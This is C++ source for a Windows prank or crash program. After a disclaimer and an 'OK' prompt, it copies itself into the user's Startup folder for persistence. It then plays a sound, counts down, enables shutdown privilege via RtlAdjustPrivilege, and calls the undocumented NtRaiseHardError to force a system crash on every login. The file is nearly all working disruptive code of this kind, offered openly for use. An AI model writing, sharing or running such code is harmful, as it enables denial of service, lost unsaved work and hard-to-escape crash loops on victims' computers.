#include <windows.h>
#include <iostream>
#include <filesystem>

#pragma comment(lib, "ntdll.lib")


EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

int main(void)
{
   std::string x;
   std::cout << "This software is licensed under the MIT license" << std::endl;
   std::cout << "The author of this software does not claim liability for any damages caused by the program, as per set out in the license." << std::endl;
   std::cout << "For more information, go here: https://github.com/Crazypersonalph/Win-Crash/" << std::endl;
   std::cout << "This is your chance to exit out of the program.\nType in OK to continue.\nBy typing in OK, you are agreeing that the author of this program claims no liability for any damage caused by said program, as set forth in the MIT license." << std::endl;
   std::cin >> x;
   if (x != "OK"){

      abort();

   }

     char * user = getenv("username");
     int counter = 15;
     std::string startup = "C:\\Users\\" + std::string(user) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\main.exe";
     std::string filename = "main.exe";
     std::string sound = "FX9eEhoRZhY.wav";
     CopyFile(filename.c_str(), startup.c_str(),true);
     CopyFile(sound.c_str(), startup.c_str(),true);
     PlaySoundA("FX9eEhoRZhY.wav", NULL, SND_ASYNC | SND_FILENAME);

     while (counter >= 1)
     {
        std::cout << "\rTime remaining: " << counter << std::endl;
        Sleep(1000);
        counter--;
     }

     BOOLEAN bl;
     RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
     unsigned long response;
     NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);

     return 0;
}